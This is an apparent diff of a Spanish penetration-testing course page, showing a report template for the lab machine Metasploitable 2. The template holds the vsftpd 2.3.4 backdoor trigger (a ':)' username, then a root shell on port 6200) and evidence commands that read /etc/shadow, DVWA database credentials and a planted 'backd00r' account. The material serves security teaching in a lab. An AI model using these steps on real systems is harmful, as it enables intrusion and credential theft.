-<span id="cb39-32"><a href="#cb39-32" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-33"><a href="#cb39-33" aria-hidden="true" tabindex="-1"></a>---</span>
-<span id="cb39-34"><a href="#cb39-34" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-35"><a href="#cb39-35" aria-hidden="true" tabindex="-1"></a><span class="fu">## 2. Hallazgos Técnicos</span></span>
-<span id="cb39-36"><a href="#cb39-36" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-37"><a href="#cb39-37" aria-hidden="true" tabindex="-1"></a><span class="fu">### Finding 1 — vsftpd 2.3.4 Backdoor</span></span>
-<span id="cb39-38"><a href="#cb39-38" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-39"><a href="#cb39-39" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Campo        <span class="pp">|</span> Detalle                                     <span class="pp">|</span></span>
-<span id="cb39-40"><a href="#cb39-40" aria-hidden="true" tabindex="-1"></a><span class="pp">|--------------|---------------------------------------------|</span></span>
-<span id="cb39-41"><a href="#cb39-41" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **CVE**      <span class="pp">|</span> CVE-2011-2523                               <span class="pp">|</span></span>
-<span id="cb39-42"><a href="#cb39-42" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **CVSS v3**  <span class="pp">|</span> 9.8 (Crítico)                               <span class="pp">|</span></span>
-<span id="cb39-43"><a href="#cb39-43" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Puerto**   <span class="pp">|</span> 21/tcp (FTP)                                <span class="pp">|</span></span>
-<span id="cb39-44"><a href="#cb39-44" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Servicio** <span class="pp">|</span> vsftpd 2.3.4                                <span class="pp">|</span></span>
-<span id="cb39-45"><a href="#cb39-45" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Impacto**  <span class="pp">|</span> Ejecución remota de código como root        <span class="pp">|</span></span>
-<span id="cb39-46"><a href="#cb39-46" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-47"><a href="#cb39-47" aria-hidden="true" tabindex="-1"></a>**Descripción**: La versión 2.3.4 de vsftpd fue distribuida con una </span>
-<span id="cb39-48"><a href="#cb39-48" aria-hidden="true" tabindex="-1"></a>backdoor maliciosa. Al autenticarse con un usuario que contenga <span class="in">`:)`</span>, </span>
-<span id="cb39-49"><a href="#cb39-49" aria-hidden="true" tabindex="-1"></a>el servidor abre una shell root en el puerto 6200.</span>
-<span id="cb39-50"><a href="#cb39-50" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-51"><a href="#cb39-51" aria-hidden="true" tabindex="-1"></a>**Pasos de reproducción**:</span>
-<span id="cb39-52"><a href="#cb39-52" aria-hidden="true" tabindex="-1"></a><span class="ss">1. </span>Conectar al puerto 21 de la víctima</span>
-<span id="cb39-53"><a href="#cb39-53" aria-hidden="true" tabindex="-1"></a><span class="ss">2. </span>Enviar usuario <span class="in">`cualquiera:)`</span> con contraseña aleatoria</span>
-<span id="cb39-54"><a href="#cb39-54" aria-hidden="true" tabindex="-1"></a><span class="ss">3. </span>Conectar al puerto 6200 para obtener shell root</span>
-<span id="cb39-55"><a href="#cb39-55" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb39-56"><a href="#cb39-56" aria-hidden="true" tabindex="-1"></a>**Evidencia**:</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb40"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="fu"># Informe de Prueba de Penetración</span></span>
+<span id="cb40-2"><a href="#cb40-2" aria-hidden="true" tabindex="-1"></a>**Cliente**: <span class="co">[</span><span class="ot">Nombre del cliente</span><span class="co">]</span></span>
+<span id="cb40-3"><a href="#cb40-3" aria-hidden="true" tabindex="-1"></a>**Clasificación**: CONFIDENCIAL</span>
+<span id="cb40-4"><a href="#cb40-4" aria-hidden="true" tabindex="-1"></a>**Fecha**: <span class="co">[</span><span class="ot">Fecha de entrega</span><span class="co">]</span></span>
+<span id="cb40-5"><a href="#cb40-5" aria-hidden="true" tabindex="-1"></a>**Versión**: 1.0</span>
+<span id="cb40-6"><a href="#cb40-6" aria-hidden="true" tabindex="-1"></a>**Preparado por**: <span class="co">[</span><span class="ot">Tu nombre</span><span class="co">]</span></span>
+<span id="cb40-7"><a href="#cb40-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-8"><a href="#cb40-8" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb40-9"><a href="#cb40-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-10"><a href="#cb40-10" aria-hidden="true" tabindex="-1"></a><span class="fu">## 1. Resumen Ejecutivo</span></span>
+<span id="cb40-11"><a href="#cb40-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-12"><a href="#cb40-12" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.1 Alcance</span></span>
+<span id="cb40-13"><a href="#cb40-13" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Sistema objetivo**: Metasploitable 2 (192.168.56.102)</span>
+<span id="cb40-14"><a href="#cb40-14" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Período de prueba**: <span class="co">[</span><span class="ot">Fecha inicio</span><span class="co">]</span> — <span class="co">[</span><span class="ot">Fecha fin</span><span class="co">]</span></span>
+<span id="cb40-15"><a href="#cb40-15" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Metodología**: Caja negra / Caja gris</span>
+<span id="cb40-16"><a href="#cb40-16" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Herramientas**: Kali Linux, Metasploit Framework, nmap, enum4linux, nikto</span>
+<span id="cb40-17"><a href="#cb40-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-18"><a href="#cb40-18" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.2 Hallazgos Principales</span></span>
+<span id="cb40-19"><a href="#cb40-19" aria-hidden="true" tabindex="-1"></a>Durante la evaluación se identificaron **X vulnerabilidades críticas**, </span>
+<span id="cb40-20"><a href="#cb40-20" aria-hidden="true" tabindex="-1"></a>**Y altas** y **Z medias**. El sistema objetivo fue completamente </span>
+<span id="cb40-21"><a href="#cb40-21" aria-hidden="true" tabindex="-1"></a>comprometido en múltiples vectores, incluyendo acceso root remoto sin </span>
+<span id="cb40-22"><a href="#cb40-22" aria-hidden="true" tabindex="-1"></a>autenticación. Se recomienda parcheo inmediato de los servicios expuestos</span>
+<span id="cb40-23"><a href="#cb40-23" aria-hidden="true" tabindex="-1"></a>y segmentación de red.</span>
+<span id="cb40-24"><a href="#cb40-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-25"><a href="#cb40-25" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.3 Resumen de Riesgo</span></span>
+<span id="cb40-26"><a href="#cb40-26" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Criticidad <span class="pp">|</span> Cantidad <span class="pp">|</span></span>
+<span id="cb40-27"><a href="#cb40-27" aria-hidden="true" tabindex="-1"></a><span class="pp">|------------|----------|</span></span>
+<span id="cb40-28"><a href="#cb40-28" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Crítico    <span class="pp">|</span> 3        <span class="pp">|</span></span>
+<span id="cb40-29"><a href="#cb40-29" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Alto       <span class="pp">|</span> 2        <span class="pp">|</span></span>
+<span id="cb40-30"><a href="#cb40-30" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Medio      <span class="pp">|</span> 4        <span class="pp">|</span></span>
+<span id="cb40-31"><a href="#cb40-31" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Bajo       <span class="pp">|</span> 2        <span class="pp">|</span></span>
+<span id="cb40-32"><a href="#cb40-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-33"><a href="#cb40-33" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb40-34"><a href="#cb40-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-35"><a href="#cb40-35" aria-hidden="true" tabindex="-1"></a><span class="fu">## 2. Hallazgos Técnicos</span></span>
+<span id="cb40-36"><a href="#cb40-36" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-37"><a href="#cb40-37" aria-hidden="true" tabindex="-1"></a><span class="fu">### Finding 1 — vsftpd 2.3.4 Backdoor</span></span>
+<span id="cb40-38"><a href="#cb40-38" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-39"><a href="#cb40-39" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Campo        <span class="pp">|</span> Detalle                                     <span class="pp">|</span></span>
+<span id="cb40-40"><a href="#cb40-40" aria-hidden="true" tabindex="-1"></a><span class="pp">|--------------|---------------------------------------------|</span></span>
+<span id="cb40-41"><a href="#cb40-41" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **CVE**      <span class="pp">|</span> CVE-2011-2523                               <span class="pp">|</span></span>
+<span id="cb40-42"><a href="#cb40-42" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **CVSS v3**  <span class="pp">|</span> 9.8 (Crítico)                               <span class="pp">|</span></span>
+<span id="cb40-43"><a href="#cb40-43" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Puerto**   <span class="pp">|</span> 21/tcp (FTP)                                <span class="pp">|</span></span>
+<span id="cb40-44"><a href="#cb40-44" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Servicio** <span class="pp">|</span> vsftpd 2.3.4                                <span class="pp">|</span></span>
+<span id="cb40-45"><a href="#cb40-45" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> **Impacto**  <span class="pp">|</span> Ejecución remota de código como root        <span class="pp">|</span></span>
+<span id="cb40-46"><a href="#cb40-46" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-47"><a href="#cb40-47" aria-hidden="true" tabindex="-1"></a>**Descripción**: La versión 2.3.4 de vsftpd fue distribuida con una </span>
+<span id="cb40-48"><a href="#cb40-48" aria-hidden="true" tabindex="-1"></a>backdoor maliciosa. Al autenticarse con un usuario que contenga <span class="in">`:)`</span>, </span>
+<span id="cb40-49"><a href="#cb40-49" aria-hidden="true" tabindex="-1"></a>el servidor abre una shell root en el puerto 6200.</span>
+<span id="cb40-50"><a href="#cb40-50" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-51"><a href="#cb40-51" aria-hidden="true" tabindex="-1"></a>**Pasos de reproducción**:</span>
+<span id="cb40-52"><a href="#cb40-52" aria-hidden="true" tabindex="-1"></a><span class="ss">1. </span>Conectar al puerto 21 de la víctima</span>
+<span id="cb40-53"><a href="#cb40-53" aria-hidden="true" tabindex="-1"></a><span class="ss">2. </span>Enviar usuario <span class="in">`cualquiera:)`</span> con contraseña aleatoria</span>
+<span id="cb40-54"><a href="#cb40-54" aria-hidden="true" tabindex="-1"></a><span class="ss">3. </span>Conectar al puerto 6200 para obtener shell root</span>
+<span id="cb40-55"><a href="#cb40-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb40-56"><a href="#cb40-56" aria-hidden="true" tabindex="-1"></a>**Evidencia**:</span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 <p>uid=0(root) gid=0(root) groups=0(root)</p>
 <pre><code>
 **Remediación**:
@@ -1272,20 +1294,20 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 </ol>
 <section id="flags-para-capturar-evidencia" class="level3" data-number="17.9.1">
 <h3 data-number="17.9.1" class="anchored" data-anchor-id="flags-para-capturar-evidencia"><span class="header-section-number">17.9.1</span> Flags para Capturar (Evidencia)</h3>
-<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb41"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 1 — contenido de /etc/shadow (primeras 3 líneas)</span></span>
-<span id="cb41-2"><a href="#cb41-2" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> <span class="at">-3</span> /etc/shadow</span>
-<span id="cb41-3"><a href="#cb41-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb41-4"><a href="#cb41-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 2 — ID del proceso de Metasploit activo</span></span>
-<span id="cb41-5"><a href="#cb41-5" aria-hidden="true" tabindex="-1"></a><span class="ex">pgrep</span> <span class="at">-a</span> postgres</span>
-<span id="cb41-6"><a href="#cb41-6" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb41-7"><a href="#cb41-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 3 — contenido del archivo de configuración de DVWA</span></span>
-<span id="cb41-8"><a href="#cb41-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /var/www/dvwa/config/config.inc.php <span class="kw">|</span> <span class="fu">grep</span> db_</span>
-<span id="cb41-9"><a href="#cb41-9" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb41-10"><a href="#cb41-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 4 — usuario backdoor creado</span></span>
-<span id="cb41-11"><a href="#cb41-11" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> backd00r /etc/passwd</span>
-<span id="cb41-12"><a href="#cb41-12" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb41-13"><a href="#cb41-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 5 — versión exacta del kernel</span></span>
-<span id="cb41-14"><a href="#cb41-14" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-r</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb42"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb42-1"><a href="#cb42-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 1 — contenido de /etc/shadow (primeras 3 líneas)</span></span>
+<span id="cb42-2"><a href="#cb42-2" aria-hidden="true" tabindex="-1"></a><span class="fu">head</span> <span class="at">-3</span> /etc/shadow</span>
+<span id="cb42-3"><a href="#cb42-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb42-4"><a href="#cb42-4" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 2 — ID del proceso de Metasploit activo</span></span>
+<span id="cb42-5"><a href="#cb42-5" aria-hidden="true" tabindex="-1"></a><span class="ex">pgrep</span> <span class="at">-a</span> postgres</span>
+<span id="cb42-6"><a href="#cb42-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb42-7"><a href="#cb42-7" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 3 — contenido del archivo de configuración de DVWA</span></span>
+<span id="cb42-8"><a href="#cb42-8" aria-hidden="true" tabindex="-1"></a><span class="fu">cat</span> /var/www/dvwa/config/config.inc.php <span class="kw">|</span> <span class="fu">grep</span> db_</span>
+<span id="cb42-9"><a href="#cb42-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb42-10"><a href="#cb42-10" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 4 — usuario backdoor creado</span></span>
+<span id="cb42-11"><a href="#cb42-11" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> backd00r /etc/passwd</span>
+<span id="cb42-12"><a href="#cb42-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb42-13"><a href="#cb42-13" aria-hidden="true" tabindex="-1"></a><span class="co"># Flag 5 — versión exacta del kernel</span></span>
+<span id="cb42-14"><a href="#cb42-14" aria-hidden="true" tabindex="-1"></a><span class="fu">uname</span> <span class="at">-r</span></span></code></pre></div><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></div>
 </section>
 <section id="capturas-de-pantalla-requeridas" class="level3" data-number="17.9.2">
 <h3 data-number="17.9.2" class="anchored" data-anchor-id="capturas-de-pantalla-requeridas"><span class="header-section-number">17.9.2</span> Capturas de Pantalla Requeridas</h3>
@@ -1917,7 +1939,7 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
       &nbsp;
     </div>
     <div class="nav-footer-right">
-<p><a href="about.qmd">Acerca de</a> | <a href="license.qmd">Licencia</a></p>
+<p><a href="../about.html">Acerca de</a> | <a href="../license.html">Licencia</a></p>
 </div>
   </div>
 </footer>
